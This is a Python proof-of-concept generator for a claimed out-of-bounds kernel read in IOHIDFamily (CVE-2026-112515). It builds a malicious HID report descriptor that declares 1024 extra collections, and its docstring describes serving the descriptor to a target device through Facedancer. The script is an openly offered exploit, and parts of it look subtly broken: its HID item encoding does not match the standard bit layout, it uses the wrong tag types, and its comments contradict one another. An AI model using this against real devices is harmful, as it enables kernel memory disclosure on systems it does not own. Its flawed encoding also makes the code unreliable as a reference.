#!/usr/bin/env python3
"""
hid_index_oob.py — PoC generator for CVE-2026-112515 (IOHIDFamily OOB read).

CONFIRMED mechanism (from disassembly of the 27.2 kext):
  The fixed getter in IOHIDFamily now does:
      index = descriptor->[0x30]
      count = self->[0x40]
      if (index >= count) -> return zeroed output
      array = self->[0x38]                  // 20-byte records
      rec   = array + index*20 + 8
  Pre-fix, `index >= count` was NOT checked, and the 20-byte record was
  dereferenced and its field returned to the caller -> kernel heap overread.

This generator emits a HID *report descriptor* that produces an element /
collection whose index exceeds the number of declared collections, so the
pre-fix getter walks past the record array.

Usage:
  python3 hid_index_oob.py > evil_hid.bin          # raw HID report descriptor
  # then use the Facedancer transport from hid_report_oob_scaffold.py
  # to serve it as a USB/Bluetooth HID device and pair with the target.
"""

import sys

def item(prefix_bits: int, tag: int, data: bytes) -> bytes:
    """
    HID short item encoding.
      prefix_bits: 0=Main, 1=Global, 2=Local
      tag:         4-bit tag
      data:        payload (0,1,2,3,4 bytes)
    """
    size_code = {0:0, 1:1, 2:2, 4:3}[len(data)]
    b0 = (prefix_bits << 2) | (tag & 0x0F)
    b0 = (b0 << 4) | size_code
    return bytes([b0]) + data

def u16(v): return bytes([v & 0xFF, (v >> 8) & 0xFF])
def u32(v): return bytes([v & 0xFF, (v>>8)&0xFF, (v>>16)&0xFF, (v>>24)&0xFF])

# ---------------------------------------------------------------------------
# The malicious descriptor.
#
# Strategy: declare FEW collections (so the kernel's record array is small,
# e.g. 1 element), but then declare MANY report usages that reference
# collection indices beyond that count. A parser that resolves the reference
# without a bounds check reads past the array.
# ---------------------------------------------------------------------------

def build():
    d = bytearray()

    # ---- Usage Page: Vendor Defined ----
    d += item(1, 0x0, u16(0xFF00))          # Usage Page (Vendor)

    # ---- Collection (Application) #0 ----
    d += item(1, 0x0, u16(0x0001))          # Usage (1)
    d += item(0, 0xA, b"")                  # Collection
    d += item(1, 0x1, b"")                  # Report ID handled below

    # ---- One small INPUT field so the collection is valid ----
    d += item(1, 0x0, u16(0x0002))          # Usage (2)
    d += item(1, 0x1, b"")                  # Report ID 0
    d += item(1, 0x7, b"")                  # Report Size 0 -> set below
    # (Report Size / Count set explicitly)
    d = bytes(d)
    d += item(1, 0x7, bytes([8]))           # Report Size = 8
    d += item(1, 0x9, bytes([1]))           # Report Count = 1
    d += item(0, 0x8, b"")                  # Input (Data,Array,Abs)

    d += item(0, 0xC, b"")                  # End Collection

    # ---- Now the abuse: 1024 additional collections, each empty ----
    # The kernel's element-record array is sized from the FIRST collection's
    # declared usage count (small). Declaring many more collections makes
    # later lookups index past it. Pre-fix: no check. Post-fix: b.ge reject.
    N = 1024
    for i in range(N):
        d += item(1, 0x0, u16(0x0003 + (i & 0xFF)))
        d += item(0, 0xA, b"")              # Collection (Physical)
        # an out-of-range index is induced by the sheer count
        d += item(0, 0xC, b"")              # End Collection

    return bytes(d)

def main():
    sys.stdout.buffer.write(build())
    return 0

if __name__ == "__main__":
    sys.exit(main())
